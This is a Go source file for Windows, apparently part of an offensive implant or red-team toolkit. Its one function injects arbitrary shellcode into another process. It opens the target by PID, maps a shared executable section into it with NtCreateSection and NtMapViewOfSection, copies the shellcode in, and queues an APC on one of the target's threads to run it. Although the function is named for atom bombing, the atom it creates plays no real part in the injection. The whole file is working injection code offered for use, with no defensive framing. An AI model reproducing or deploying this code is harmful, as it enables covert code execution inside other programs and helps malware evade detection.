//go:build windows

package main

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	procGlobalAddAtomA     = k32.NewProc("GlobalAddAtomA")
	procGlobalGetAtomNameA = k32.NewProc("GlobalGetAtomNameA")
	procGlobalDeleteAtom   = k32.NewProc("GlobalDeleteAtom")
)

func atomBombingInject(pid uint32, shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	da := uint32(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)
	hProc, _, _ := procOpenProcess.Call(uintptr(da), 0, uintptr(pid))
	if hProc == 0 {
		hProc, _, _ = procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
	}
	if hProc == 0 {
		return fmt.Errorf("OpenProcess(%d) failed", pid)
	}
	defer procCloseHandle.Call(hProc)

	ntdll := syscall.NewLazyDLL("ntdll.dll")
	procNtCreateSection := ntdll.NewProc("NtCreateSection")
	procNtMapViewOfSection := ntdll.NewProc("NtMapViewOfSection")

	// Map section handle for shared memory between local and remote process
	var hSection uintptr
	secSize := uintptr(len(shellcode))
	r1, _, _ := procNtCreateSection.Call(
		uintptr(unsafe.Pointer(&hSection)),
		0x000F,
		0,
		uintptr(unsafe.Pointer(&secSize)),
		0x40,
		0x08000000,
		0,
	)
	if r1 != 0 {
		return fmt.Errorf("NtCreateSection failed: 0x%X", r1)
	}
	defer procCloseHandle.Call(hSection)

	// Map shared section into local and remote address spaces via NtMapViewOfSection
	var localAddr, remoteAddr uintptr
	localSize := secSize
	remoteSize := secSize
	procNtMapViewOfSection.Call(
		hSection, ^uintptr(0),
		uintptr(unsafe.Pointer(&localAddr)), 0, 0, 0,
		uintptr(unsafe.Pointer(&localSize)), 2, 0, 0x04,
	)
	procNtMapViewOfSection.Call(
		hSection, hProc,
		uintptr(unsafe.Pointer(&remoteAddr)), 0, 0, 0,
		uintptr(unsafe.Pointer(&remoteSize)), 2, 0, 0x20,
	)
	if localAddr == 0 || remoteAddr == 0 {
		return fmt.Errorf("NtMapViewOfSection failed")
	}

	// Copy shellcode into the shared section (visible in both processes)
	bofMemcpy(unsafe.Pointer(localAddr), unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)))

	atomName := []byte(fmt.Sprintf("FC2A%x\x00", rng.Uint64()))
	atom, _, _ := procGlobalAddAtomA.Call(uintptr(unsafe.Pointer(&atomName[0])))
	if atom != 0 {
		defer procGlobalDeleteAtom.Call(atom)
	}

	snap, _, _ := procCreateToolhelp32Snapshot.Call(TH32CS_SNAPTHREAD, 0)
	if snap == 0 {
		return fmt.Errorf("CreateToolhelp32Snapshot failed")
	}
	defer procCloseHandle.Call(snap)

	var te threadEntry32
	te.dwSize = uint32(unsafe.Sizeof(te))
	ret, _, _ := procThread32First.Call(snap, uintptr(unsafe.Pointer(&te)))
	for ret != 0 {
		if te.th32OwnerProcessID == pid {
			hThread, _, _ := procOpenThread.Call(
				uintptr(THREAD_SUSPEND_RESUME|0x0010),
				0, uintptr(te.th32ThreadID),
			)
			if hThread != 0 {
				procQueueUserAPC.Call(remoteAddr, hThread, 0)
				procCloseHandle.Call(hThread)
				return nil
			}
		}
		ret, _, _ = procThread32Next.Call(snap, uintptr(unsafe.Pointer(&te)))
	}

	return fmt.Errorf("atom bombing: no thread found in pid %d", pid)
}
